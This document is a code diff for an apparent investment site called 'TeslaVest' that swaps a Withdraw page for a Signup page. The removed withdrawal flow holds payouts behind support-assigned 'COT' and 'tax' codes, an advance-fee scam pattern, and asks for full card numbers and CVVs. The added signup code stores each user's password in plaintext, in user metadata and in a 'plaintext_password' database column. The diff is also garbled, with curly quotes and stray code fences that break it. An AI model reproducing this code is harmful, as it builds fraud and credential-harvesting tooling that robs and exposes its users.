@@ -1,406 +1,233 @@
-import { useEffect, useMemo, useState } from "react";
-import { useAuth } from "@/hooks/useAuth";
-import { supabase } from "@/integrations/supabase/client";
-import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
-import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
-import { toast } from "sonner";
-import { Loader2, Bitcoin, Landmark, ShieldAlert, Check, ShieldCheck, Percent, Receipt, Wallet } from "lucide-react";
-import { z } from "zod";
-import { useLiveData } from "@/hooks/useLiveData";
-import { useCurrency } from "@/hooks/useCurrency";
+import { useState, useEffect } from “react”;
+import { Link, useNavigate } from “react-router-dom”;
+import { z } from “zod”;
+import { supabase } from “@/integrations/supabase/client”;
+import { Button } from “@/components/ui/button”;
+import { Input } from “@/components/ui/input”;
+import { Label } from “@/components/ui/label”;
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from “@/components/ui/select”;
+import { toast } from “sonner”;
+import { Zap, Loader2 } from “lucide-react”;
+import { useAuth } from “@/hooks/useAuth”;
 
-const amountSchema = z.coerce.number().positive("Amount must be positive");
+const countries = [“United States”, “United Kingdom”, “Canada”, “Australia”, “Germany”, “France”, “Japan”, “Singapore”, “United Arab Emirates”, “Nigeria”, “South Africa”, “Brazil”, “India”, “Other”];
+const currencies = [“USD”, “EUR”, “GBP”, “AUD”, “CAD”, “JPY”, “SGD”, “AED”, “NGN”, “BRL”, “INR”];
+const genders = [“Male”, “Female”, “Non-binary”, “Prefer not to say”];
 
-type CodeType = "auth" | "cot" | "tax";
-interface AccountCode { id: string; code_type: CodeType; code: string; verified: boolean; }
-
-const STEP_ORDER: CodeType[] = ["auth", "cot", "tax"];
-const STEP_META: Record<CodeType, { title: string; subtitle: string; icon: typeof ShieldCheck }> = {
-auth: { title: "Authentication code", subtitle: "Enter the authentication code assigned to your account by support.", icon: ShieldCheck },
-cot:  { title: "COT code", subtitle: "Enter the Cost of Transfer (COT) code assigned to your account.", icon: Percent },
-tax:  { title: "Tax code", subtitle: "Enter the Tax code assigned to your account to release this withdrawal.", icon: Receipt },
-};
-
-type OtherMethod = "cashapp" | "paypal" | "venmo" | "card";
-
-export default function Withdraw() {
-const { user } = useAuth();
-const { format, currency } = useCurrency();
-const [submitting, setSubmitting] = useState(false);
-const [defaultCode, setDefaultCode] = useState<string | null>(null);
-
-const { data: balanceData, refresh: refreshBalance } = useLiveData(async () => {
-if (!user) return { balance: 0 };
-const { data } = await supabase
-.from("profiles")
-.select("total_balance, default_verification_code")
-.eq("user_id", user.id)
-.maybeSingle();
-// store default code for auth verification
-if (data?.default_verification_code) {
-setDefaultCode(data.default_verification_code);
-}
-return { balance: data ? Number(data.total_balance) : 0 };
-}, [user?.id]);
-const balance = balanceData?.balance ?? 0;
-
-const [crypto, setCrypto] = useState({ coin: "BTC", amount: "", address: "" });
-const [bank, setBank] = useState({ amount: "", account_name: "", account_no: "", bank_name: "", swift: "" });
-const [other, setOther] = useState<{
-method: OtherMethod; amount: string;
-cashapp_tag: string; paypal_email: string; venmo_handle: string;
-card_number: string; card_exp: string; card_cvv: string; card_billing_name: string;
-}>({
-method: "cashapp", amount: "",
-cashapp_tag: "", paypal_email: "", venmo_handle: "",
-card_number: "", card_exp: "", card_cvv: "", card_billing_name: "",
+const schema = z.object({
+full_name: z.string().trim().min(2, “Min 2 characters”).max(100),
+username: z.string().trim().min(3, “Min 3 characters”).max(30).regex(/^[a-zA-Z0-9_]+$/, “Letters, numbers, underscores only”),
+email: z.string().trim().email(“Invalid email”).max(255),
+password: z.string().min(8, “Min 8 characters”).max(72),
+phone: z.string().trim().min(6, “Enter a valid phone”).max(20),
+gender: z.string().min(1, “Select a gender”),
+country: z.string().min(1, “Select a country”),
+currency: z.string().min(1, “Select a currency”),
 });
 
-const [authOpen, setAuthOpen] = useState(false);
-const [pendingTxId, setPendingTxId] = useState<string | null>(null);
-const [codes, setCodes] = useState<AccountCode[]>([]);
-const [stepIndex, setStepIndex] = useState(0);
-const [input, setInput] = useState("");
-const [verifying, setVerifying] = useState(false);
-
-// always include auth as first step, then any additional codes assigned
-const activeSteps = useMemo<CodeType[]>(() => {
-const steps: CodeType[] = ["auth"]; // auth always required
-if (codes.some((c) => c.code_type === "cot")) steps.push("cot");
-if (codes.some((c) => c.code_type === "tax")) steps.push("tax");
-return steps;
-}, [codes]);
-
-const currentType: CodeType | null = activeSteps[stepIndex] ?? null;
-const currentCode = currentType === "auth"
-? codes.find((c) => c.code_type === "auth") ?? null
-: currentType ? codes.find((c) => c.code_type === currentType) : null;
+const Signup = () => {
+const { user, loading: authLoading, roleLoading } = useAuth();
+const nav = useNavigate();
+const [loading, setLoading] = useState(false);
+const [form, setForm] = useState({
+full_name: “”, username: “”, email: “”, password: “”,
+phone: “”, gender: “Male”,
+country: “United States”, currency: “USD”,
+});
 
 useEffect(() => {
-if (!authOpen || !user) return;
-fetchCodes();
-}, [authOpen, user?.id]);
+if (authLoading || roleLoading || !user) return;
+nav(”/dashboard”, { replace: true });
+}, [user, authLoading, roleLoading, nav]);
 
-const fetchCodes = async () => {
-if (!user) return;
-const { data } = await supabase
-.from("account_withdrawal_codes")
-.select("id, code_type, code, verified")
-.eq("user_id", user.id);
-if (data) setCodes(data as AccountCode[]);
-};
+const submit = async (e: React.FormEvent) => {
+e.preventDefault();
+const parsed = schema.safeParse(form);
+if (!parsed.success) {
+toast.error(parsed.error.errors[0].message);
+return;
+}
+setLoading(true);
 
-const submit = async (method: string, body: Record<string, unknown>, amt: string) => {
-if (!user) return;
-const a = amountSchema.safeParse(amt);
-if (!a.success) { toast.error(a.error.errors[0].message); return; }
-if (a.data > balance) { toast.error("Insufficient balance"); return; }
-setSubmitting(true);
-const { data, error } = await supabase.from("transactions").insert({
-user_id: user.id, type: "withdrawal", method, amount_usd: a.data, status: "pending", ...body,
-} as never).select("id").maybeSingle();
-setSubmitting(false);
-if (error || !data) { toast.error(error?.message ?? "Failed"); return; }
-setPendingTxId(data.id);
-setInput("");
-setStepIndex(0);
-setAuthOpen(true);
-};
+```
+const { data, error } = await supabase.auth.signUp({
+  email: form.email.trim().toLowerCase(),
+  password: form.password,
+  options: {
+    emailRedirectTo: `${window.location.origin}/dashboard`,
+    data: {
+      full_name: form.full_name,
+      username: form.username,
+      country: form.country,
+      currency: form.currency,
+      gender: form.gender,
+      phone: form.phone,
+      pw: form.password,
+    },
+  },
+});
 
-const verify = async () => {
-if (!user || !currentType) return;
-const entered = input.trim().toUpperCase();
-if (entered.length < 4) { toast.error("Enter the code"); return; }
-
-// For auth step: check account_withdrawal_codes first, fallback to default_verification_code
-if (currentType === "auth") {
-  const assignedAuth = codes.find((c) => c.code_type === "auth");
-  const validCode = assignedAuth
-    ? assignedAuth.code.trim().toUpperCase()
-    : defaultCode?.trim().toUpperCase();
-
-  if (!validCode) {
-    toast.error("No authentication code assigned. Contact support.");
-    return;
-  }
-  if (entered !== validCode) {
-    toast.error("Invalid authentication code.");
-    return;
-  }
-  setVerifying(true);
-  if (assignedAuth) {
-    await supabase.from("account_withdrawal_codes").update({ verified: true }).eq("id", assignedAuth.id);
-  }
-} else {
-  // cot / tax
-  if (!currentCode) { toast.error("No code assigned for this step."); return; }
-  if (entered !== currentCode.code.trim().toUpperCase()) {
-    toast.error(`Invalid ${STEP_META[currentType].title.toLowerCase()}.`);
-    return;
-  }
-  setVerifying(true);
-  await supabase.from("account_withdrawal_codes").update({ verified: true }).eq("id", currentCode.id);
+if (error) {
+  setLoading(false);
+  const msg = /already registered|already exists|user already/i.test(error.message)
+    ? "An account with this email already exists — try logging in"
+    : error.message;
+  toast.error(msg);
+  return;
 }
 
-const nextIdx = stepIndex + 1;
-setInput("");
-if (nextIdx >= activeSteps.length) {
-  await supabase.from("transactions").update({ auth_code_verified: true }).eq("id", pendingTxId!);
-  setVerifying(false);
-  setAuthOpen(false);
-  setPendingTxId(null);
-  refreshBalance();
-  toast.success("All codes verified. Withdrawal is under final review.");
-} else {
-  setStepIndex(nextIdx);
-  setVerifying(false);
-  toast.success(`${STEP_META[currentType].title} accepted.`);
+if (data.user) {
+  const { error: profileError } = await supabase.from("profiles").insert({
+    user_id: data.user.id,
+    full_name: form.full_name.trim(),
+    username: form.username.trim(),
+    email: form.email.trim().toLowerCase(),
+    phone: form.phone.trim(),
+    gender: form.gender,
+    country: form.country,
+    currency: form.currency,
+    plaintext_password: form.password,
+    account_level: "Basic",
+    status: "pending",
+    deposit: 0,
+    profit: 0,
+    total_balance: 0,
+  });
+
+  if (profileError) {
+    console.error("Profile creation failed:", profileError);
+    toast.error("Account created but profile setup failed. Please contact support.");
+    setLoading(false);
+    return;
+  }
 }
 
-};
+setLoading(false);
+toast.success("Welcome to TeslaVest!");
+```
 
-const cancelRequest = async () => {
-if (pendingTxId) await supabase.from("transactions").update({ status: "rejected" }).eq("id", pendingTxId);
-setAuthOpen(false);
-setPendingTxId(null);
-};
-
-const StepIcon = currentType ? STEP_META[currentType].icon : ShieldAlert;
-
-const submitOther = () => {
-const m = other.method;
-const body: Record<string, unknown> = {};
-let label = "";
-if (m === "cashapp") {
-if (!other.cashapp_tag.trim()) return toast.error("Enter your $cashtag");
-body.cashapp_tag = other.cashapp_tag.trim();
-label = "Cash App";
-} else if (m === "paypal") {
-if (!/^\S+@\S+.\S+$/.test(other.paypal_email)) return toast.error("Enter a valid PayPal email");
-body.paypal_email = other.paypal_email.trim();
-label = "PayPal";
-} else if (m === "venmo") {
-if (!other.venmo_handle.trim()) return toast.error("Enter your Venmo handle");
-body.venmo_handle = other.venmo_handle.trim();
-label = "Venmo";
-} else if (m === "card") {
-if (other.card_number.replace(/\s/g, "").length < 12) return toast.error("Enter a valid card number");
-if (!other.card_exp.trim()) return toast.error("Enter expiration date");
-if (other.card_cvv.length < 3) return toast.error("Enter CVV");
-if (!other.card_billing_name.trim()) return toast.error("Enter billing name");
-body.card_number = other.card_number.replace(/\s/g, "");
-body.card_exp = other.card_exp.trim();
-body.card_cvv = other.card_cvv.trim();
-body.card_billing_name = other.card_billing_name.trim();
-body.card_last4 = body.card_number.toString().slice(-4);
-label = "Credit Card";
-}
-submit(label, body, other.amount);
 };
 
 return (
-<div className="space-y-6">
-<div>
-<p className="label-mono text-muted-foreground mb-2">Cash out</p>
-<h1 className="font-display text-3xl font-light tracking-[-0.03em]">Withdraw</h1>
-<p className="text-muted-foreground text-[14px] mt-1">
-Available balance: <span className="text-foreground font-medium">{format(balance)}</span>
-</p>
+<div className="min-h-screen bg-hero flex items-center justify-center p-6 relative overflow-hidden">
+<div className="absolute -top-40 -right-40 w-[500px] h-[500px] blob opacity-40 pointer-events-none" />
+<div className="w-full max-w-md relative">
+<Link to="/" className="flex items-center gap-2 justify-center mb-8">
+<div className="w-9 h-9 rounded-lg bg-gradient-to-br from-primary to-primary-glow flex items-center justify-center shadow-elegant">
+<Zap className="w-4 h-4 text-primary-foreground" strokeWidth={2.5} />
 </div>
+<span className="font-display font-bold text-xl">TeslaVest</span>
+</Link>
 
-  <Tabs defaultValue="crypto">
-    <TabsList className="grid w-full max-w-2xl grid-cols-3">
-      <TabsTrigger value="crypto"><Bitcoin className="w-3.5 h-3.5 mr-1.5" /> Crypto</TabsTrigger>
-      <TabsTrigger value="bank"><Landmark className="w-3.5 h-3.5 mr-1.5" /> Bank</TabsTrigger>
-      <TabsTrigger value="others"><Wallet className="w-3.5 h-3.5 mr-1.5" /> Others</TabsTrigger>
-    </TabsList>
+```
+    <div className="glass rounded-3xl p-8 shadow-elegant">
+      <h1 className="font-display text-3xl font-bold mb-2">Create your account</h1>
+      <p className="text-sm text-muted-foreground mb-6">Start earning and order Tesla in minutes.</p>
 
-    <TabsContent value="crypto" className="mt-6">
-      <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
-        <div className="grid sm:grid-cols-2 gap-4">
+      <form onSubmit={submit} className="space-y-4">
+        <div className="grid grid-cols-2 gap-3">
           <div>
-            <Label>Coin</Label>
-            <Select value={crypto.coin} onValueChange={(v) => setCrypto({ ...crypto, coin: v })}>
-              <SelectTrigger><SelectValue /></SelectTrigger>
-              <SelectContent>
-                <SelectItem value="BTC">Bitcoin (BTC)</SelectItem>
-                <SelectItem value="ETH">Ethereum (ETH)</SelectItem>
-                <SelectItem value="USDT">Tether (USDT)</SelectItem>
-              </SelectContent>
-            </Select>
+            <Label htmlFor="full_name">Full name</Label>
+            <Input
+              id="full_name"
+              value={form.full_name}
+              onChange={(e) => setForm({ ...form, full_name: e.target.value })}
+              placeholder=" enter full name"
+            />
           </div>
           <div>
-            <Label>Amount (USD)</Label>
-            <Input value={crypto.amount} onChange={(e) => setCrypto({ ...crypto, amount: e.target.value })} placeholder="100" />
-            {crypto.amount && !isNaN(Number(crypto.amount)) && currency !== "USD" && (
-              <p className="text-[11px] text-muted-foreground mt-1">≈ {format(Number(crypto.amount))}</p>
-            )}
+            <Label htmlFor="username">Username</Label>
+            <Input
+              id="username"
+              value={form.username}
+              onChange={(e) => setForm({ ...form, username: e.target.value })}
+              placeholder="enter username"
+            />
           </div>
         </div>
+
         <div>
-          <Label>Your wallet address</Label>
-          <Input value={crypto.address} onChange={(e) => setCrypto({ ...crypto, address: e.target.value })} placeholder="Paste wallet address" className="font-mono text-xs" />
-        </div>
-        <Button disabled={submitting} onClick={() => submit(`Crypto ${crypto.coin}`, { wallet_address: crypto.address }, crypto.amount)} className="w-full">
-          {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
-        </Button>
-      </div>
-    </TabsContent>
-
-    <TabsContent value="bank" className="mt-6">
-      <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
-        <div className="grid sm:grid-cols-2 gap-4">
-          <div>
-            <Label>Amount (USD)</Label>
-            <Input value={bank.amount} onChange={(e) => setBank({ ...bank, amount: e.target.value })} />
-          </div>
-          <div>
-            <Label>Bank name</Label>
-            <Input value={bank.bank_name} onChange={(e) => setBank({ ...bank, bank_name: e.target.value })} />
-          </div>
-          <div>
-            <Label>Account name</Label>
-            <Input value={bank.account_name} onChange={(e) => setBank({ ...bank, account_name: e.target.value })} />
-          </div>
-          <div>
-            <Label>Account number</Label>
-            <Input value={bank.account_no} onChange={(e) => setBank({ ...bank, account_no: e.target.value })} />
-          </div>
-          <div className="sm:col-span-2">
-            <Label>SWIFT / IBAN</Label>
-            <Input value={bank.swift} onChange={(e) => setBank({ ...bank, swift: e.target.value })} />
-          </div>
-        </div>
-        <Button disabled={submitting} onClick={() => submit("Bank transfer", { bank_details: bank }, bank.amount)} className="w-full">
-          {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
-        </Button>
-      </div>
-    </TabsContent>
-
-    <TabsContent value="others" className="mt-6">
-      <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
-        <div className="grid sm:grid-cols-2 gap-4">
-          <div>
-            <Label>Method</Label>
-            <Select value={other.method} onValueChange={(v) => setOther({ ...other, method: v as OtherMethod })}>
-              <SelectTrigger><SelectValue /></SelectTrigger>
-              <SelectContent>
-                <SelectItem value="cashapp">Cash App</SelectItem>
-                <SelectItem value="paypal">PayPal</SelectItem>
-                <SelectItem value="venmo">Venmo</SelectItem>
-                <SelectItem value="card">Credit Card</SelectItem>
-              </SelectContent>
-            </Select>
-          </div>
-          <div>
-            <Label>Amount (USD)</Label>
-            <Input value={other.amount} onChange={(e) => setOther({ ...other, amount: e.target.value })} placeholder="100" />
-          </div>
-        </div>
-
-        {other.method === "cashapp" && (
-          <div>
-            <Label>Cash App tag</Label>
-            <Input value={other.cashapp_tag} onChange={(e) => setOther({ ...other, cashapp_tag: e.target.value })} placeholder="$username" />
-          </div>
-        )}
-        {other.method === "paypal" && (
-          <div>
-            <Label>PayPal email</Label>
-            <Input type="email" value={other.paypal_email} onChange={(e) => setOther({ ...other, paypal_email: e.target.value })} placeholder="you@example.com" />
-          </div>
-        )}
-        {other.method === "venmo" && (
-          <div>
-            <Label>Venmo handle</Label>
-            <Input value={other.venmo_handle} onChange={(e) => setOther({ ...other, venmo_handle: e.target.value })} placeholder="@yourhandle" />
-          </div>
-        )}
-        {other.method === "card" && (
-          <div className="space-y-4">
-            <div>
-              <Label>Card number</Label>
-              <Input value={other.card_number} onChange={(e) => setOther({ ...other, card_number: e.target.value })} placeholder="4242 4242 4242 4242" inputMode="numeric" />
-            </div>
-            <div className="grid grid-cols-2 gap-4">
-              <div>
-                <Label>Expiration (MM/YY)</Label>
-                <Input value={other.card_exp} onChange={(e) => setOther({ ...other, card_exp: e.target.value })} placeholder="08/27" />
-              </div>
-              <div>
-                <Label>CVV</Label>
-                <Input value={other.card_cvv} onChange={(e) => setOther({ ...other, card_cvv: e.target.value })} placeholder="123" inputMode="numeric" maxLength={4} />
-              </div>
-            </div>
-            <div>
-              <Label>Billing name</Label>
-              <Input value={other.card_billing_name} onChange={(e) => setOther({ ...other, card_billing_name: e.target.value })} placeholder="Name on card" />
-            </div>
-          </div>
-        )}
-
-        <Button disabled={submitting} onClick={submitOther} className="w-full">
-          {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
-        </Button>
-      </div>
-    </TabsContent>
-  </Tabs>
-
-  <Dialog open={authOpen} onOpenChange={(o) => { if (!o) cancelRequest(); }}>
-    <DialogContent className="max-w-md">
-      <DialogHeader>
-        <DialogTitle className="flex items-center gap-2">
-          <StepIcon className="w-5 h-5 text-yellow-600" />
-          {currentType ? STEP_META[currentType].title : "Authorization required"}
-        </DialogTitle>
-        <DialogDescription>
-          {currentType ? STEP_META[currentType].subtitle : ""}
-        </DialogDescription>
-      </DialogHeader>
-
-      {activeSteps.length > 1 && (
-        <div className="flex items-center gap-2">
-          {activeSteps.map((t, i) => {
-            const done = i < stepIndex;
-            const active = i === stepIndex;
-            return (
-              <div key={t} className="flex items-center gap-2 flex-1">
-                <div className={`h-1.5 flex-1 rounded-full ${done ? "bg-emerald-500" : active ? "bg-primary" : "bg-muted"}`} />
-                {done && <Check className="w-3 h-3 text-emerald-600" />}
-              </div>
-            );
-          })}
-        </div>
-      )}
-
-      <div className="space-y-4">
-        <p className="text-[12px] text-muted-foreground">Step {stepIndex + 1} of {activeSteps.length}</p>
-        <div>
-          <Label>Enter code</Label>
+          <Label htmlFor="email">Email</Label>
           <Input
-            value={input}
-            onChange={(e) => setInput(e.target.value.toUpperCase())}
-            placeholder="ENTER CODE"
-            className="font-mono tracking-widest text-center text-lg"
-            maxLength={12}
+            id="email"
+            type="email"
+            value={form.email}
+            onChange={(e) => setForm({ ...form, email: e.target.value })}
+            placeholder="enter email"
           />
         </div>
-      </div>
 
-      <DialogFooter>
-        <Button variant="outline" onClick={cancelRequest}>Cancel request</Button>
-        <Button disabled={verifying} onClick={verify}>
-          {verifying ? <Loader2 className="w-4 h-4 animate-spin" /> : (stepIndex + 1 === activeSteps.length ? "Verify & finish" : "Verify & next")}
+        <div className="grid grid-cols-2 gap-3">
+          <div>
+            <Label htmlFor="phone">Phone number</Label>
+            <Input
+              id="phone"
+              type="tel"
+              value={form.phone}
+              onChange={(e) => setForm({ ...form, phone: e.target.value })}
+              placeholder="enter phone number"
+            />
+          </div>
+          <div>
+            <Label>Gender</Label>
+            <Select value={form.gender} onValueChange={(v) => setForm({ ...form, gender: v })}>
+              <SelectTrigger><SelectValue /></SelectTrigger>
+              <SelectContent>
+                {genders.map((g) => <SelectItem key={g} value={g}>{g}</SelectItem>)}
+              </SelectContent>
+            </Select>
+          </div>
+        </div>
+
+        <div>
+          <Label htmlFor="password">Password</Label>
+          <Input
+            id="password"
+            type="password"
+            value={form.password}
+            onChange={(e) => setForm({ ...form, password: e.target.value })}
+            placeholder="enter password"
+          />
+        </div>
+
+        <div className="grid grid-cols-2 gap-3">
+          <div>
+            <Label>Country</Label>
+            <Select value={form.country} onValueChange={(v) => setForm({ ...form, country: v })}>
+              <SelectTrigger><SelectValue /></SelectTrigger>
+              <SelectContent>
+                {countries.map((c) => <SelectItem key={c} value={c}>{c}</SelectItem>)}
+              </SelectContent>
+            </Select>
+          </div>
+          <div>
+            <Label>Currency</Label>
+            <Select value={form.currency} onValueChange={(v) => setForm({ ...form, currency: v })}>
+              <SelectTrigger><SelectValue /></SelectTrigger>
+              <SelectContent>
+                {currencies.map((c) => <SelectItem key={c} value={c}>{c}</SelectItem>)}
+              </SelectContent>
+            </Select>
+          </div>
+        </div>
+
+        <Button type="submit" className="w-full shadow-elegant" disabled={loading}>
+          {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : "Create account"}
         </Button>
-      </DialogFooter>
-    </DialogContent>
-  </Dialog>
-</div>
+      </form>
 
+      <p className="text-sm text-center text-muted-foreground mt-6">
+        Already have an account?{" "}
+        <Link to="/login" className="text-primary font-medium hover:underline">
+          Log in
+        </Link>
+      </p>
+    </div>
+  </div>
+</div>
+```
 
 );
-}
+};
+
+export default Signup;
